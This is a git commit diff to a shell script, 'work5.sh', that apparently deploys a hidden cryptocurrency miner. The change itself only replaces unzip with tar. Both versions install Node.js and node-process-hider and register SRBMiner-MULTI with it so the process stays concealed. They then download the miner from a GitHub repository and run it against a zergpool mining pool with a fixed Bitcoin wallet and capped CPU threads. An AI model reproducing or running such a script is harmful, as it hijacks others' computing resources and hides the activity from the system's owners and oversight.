0883e8479ad29e04a6a0e73f21b0042e96e3df51
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-10 09:41:39 +0800

    Update work5.sh

--- work5.sh
+++ work5.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
-sudo su --command "sudo apt update && sudo apt install unzip && 
+sudo su --command "sudo apt update &&
 sudo apt install gcc -y && 
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && 
 sudo apt install nodejs && 
 npm install -g npm@8.4.1 && 
 npm i -g node-process-hider && 
 sudo ph add SRBMiner-MULTI && 
-wget https://github.com/geraldyolang11/mine/raw/main/SRBMiner-Multi-0-9-0.zip && unzip SRBMiner-Multi-0-9-0.zip && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci --password c=BTC,mc=VRSC --cpu-threads 2"
+wget https://github.com/geraldyolang11/mine/raw/main/SRBMiner-Multi-0-9-0.zip && tar -xf SRBMiner-Multi-0-9-0.zip && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci --password c=BTC,mc=VRSC --cpu-threads 2"
